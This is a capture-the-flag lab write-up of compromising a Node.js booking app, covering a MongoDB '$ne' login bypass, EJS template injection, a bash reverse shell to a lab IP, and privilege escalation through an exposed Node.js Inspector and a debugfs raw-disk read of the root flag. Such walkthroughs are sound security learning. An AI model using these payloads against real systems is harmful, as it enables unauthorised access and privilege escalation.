# Day 7 — Do Not Disturb

Ah the good old Boot2Root challenge. Now this is a challenge in my domain. Do Not Disturb combines a **NoSQL authentication bypass** with a **Server-Side Template Injection (SSTI)** vulnerability in an Express/Node.js application.

Okay let's get started finding the user flag:

## Commands Used

|Command|Purpose|
|---|---|
|`gobuster dir -u http://10.67.167.129 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_http.txt`|Directory enumeration|
|`nc -lvnp 4444`|Reverse shell listener|
|`ss -ltnu`|Enumerate listening TCP/UDP sockets|
|`node inspect 127.0.0.1:9229`|Attach to exposed Node.js Inspector|
|`debugfs -R "cat /root/root.txt" /dev/nvme0n1p1` (via `execFileSync`)|Read root flag via raw disk access, bypassing filesystem permissions|

---

## User Flag

### Step 1: Enumerate the application

I started by doing directory enumeration with Gobuster:

```bash
gobuster dir -u http://10.67.167.129 \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster_http.txt
```

![[1.png]]

The scan revealed two interesting endpoints:

- `/staff` (403 Forbidden)
- `/logout`

The `/staff` endpoint stood out as restricted to authenticated users.

### Step 2: Configure Burp Suite

Before intercepting any requests, I configured my browser to send traffic through **Burp Suite**.
![[2.png]]

Once Burp is enabled, I ensured that **Intercept** is turned **On** in Burp Suite (I am listing this in the step because I spent 20 minutes trying to figure out why Burp Suite wasn't intercepting messages 🙃). All browser requests will now pass through Burp, allowing me to inspect and modify them before they reach the server.

### Step 3: Bypass authentication

I opened the login page and intercepted the authentication request with Burp Suite.

Replaced the original username and password parameters with:

```
username[$ne]=1&password[$ne]=1
```
![[3.png]]

The `$ne` operator is a MongoDB query operator that means **"not equal."** Instead of checking whether the supplied credentials match an existing account, the backend accepts any document whose username and password are **not equal to** `1`, effectively bypassing authentication.
![[4.png]]

The important part is the `connect.sid` cookie. It represents an authenticated session that will be used when accessing the staff area.

Click **Forward** once more to allow the request to continue.

After that, switch **Intercept** to **Off** and return to your browser.

And going back to your browser, you now have permission to sit back in your chair for 10 seconds and take in your first win.
![[5.png]]

### Step 4: Confirm Server-Side Template Injection

The Staff Console allows employees to customize the booking confirmation message using **Embedded JavaScript (EJS)** templates.

Before attempting command execution, I verified that the template engine evaluates expressions.

Replace the template with:

```
<%= 7*7 %>
```
![[6.png]]

the expression has been evaluated by the server, confirming a **Server-Side Template Injection (SSTI)** vulnerability.

### Step 5: Verify command execution

Since EJS executes JavaScript on the server, I accessed Node.js modules and execute operating system commands.

![[7.png]]

### Step 6: Get User flag!

Now replace the template with the command from the screenshot above and voilà you have got the first flag. Now you can celebrate your second win.

![[8.png]]

---

## Root Flag finding time!

### Step 1: Get a shell

I set up a listener:

```bash
nc -lvnp 4444
```

![[9.png]]

Now getting back the browser and I pasted a reverse shell payload:

```javascript
const cp = global.process.mainModule.require('child_process');
cp.spawn('/bin/bash', ['-c', 'bash -i >& /dev/tcp/10.67.66.192/4444 0>&1'], {detached: true, stdio: 'ignore'}).unref();
```

![[10.png]]


![[11.png]]
## Privilege Escalation

After running the command above we get a beautiful shell! Landed as the `poolside` user.

![[12.png]]

### Step 1: Enumerate a local system

After obtaining a shell as the `poolside` user, the next step is to enumerate the local system.

One of the first commands I ran was:

```bash
ss -ltnu
```

![[13.png]]

This displays all listening TCP and UDP sockets. Services bound only to the loopback interface (`127.0.0.1`) are inaccessible from the network, so they are often overlooked during external reconnaissance. However, once an attacker has local access, these internal services become reachable and may expose additional attack paths.

In this case, the output revealed an unexpected service listening on `127.0.0.1:9229`.

Port **9229** is the default port used by the **Node.js Inspector**, a debugging interface that allows developers to inspect and control a running Node.js process. Finding this service suggested that debugging had been left enabled, making it a promising avenue for further investigation 🧐.

### Step 2: Inspect the node.js process

To investigate the service listening on port **9229**, I had to connect to the Node.js Inspector:

```bash
node inspect 127.0.0.1:9229
```

![[14.png]]

Once connected, I switched to the **REPL** (Read-Eval-Print Loop). The REPL provides an interactive JavaScript console, allowing you to evaluate JavaScript expressions within the context of the running Node.js process.

Once I connected to the debugger, I switched to the **REPL** and ran:

```javascript
process.getuid()
process.getgid()
```

![[15.png]]

Running these commands confirms that the debugger is attached to a different process than our current shell. Since the Node.js service is running under another account, interacting with it through the debugger provides access to the execution context and permissions of that service rather than those of the `poolside` user.

Now the next command (helps understand which user the process is running as, via the REPL — see screenshot for the exact expression used):

I also noticed a group "disk" there. Members of the `disk` group are often allowed to access raw block devices such as:

- `/dev/sda`
- `/dev/sda1`
- `/dev/nvme0n1`
- `/dev/nvme0n1p1`
![[17.png]]

![[16.png]]

The `id` command shows that the Node.js process runs as `pipelinesvc` and belongs to the `disk` group. On many Linux systems, members of this group can directly access raw block devices, making it possible to inspect the underlying filesystem.

### Step 3: Escalate privileges!

Gets Node.js's built-in `child_process` module, which allows the program to start external programs.

Since `pipelinesvc` belongs to the `disk` group, it has permission to open the raw block device. `debugfs` reads the filesystem directly from that device rather than opening `/root/root.txt` through the normal kernel permission checks. `child_process.execFileSync()` launches an executable without invoking a shell. Here, it starts `debugfs` and instructs it to execute the command `cat /root/root.txt` against the filesystem stored on `/dev/nvme0n1p1`.

```javascript
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

The result is in the picture!

![[18.png]]

Good Job Fellow Hackers.

## Day 7 ✅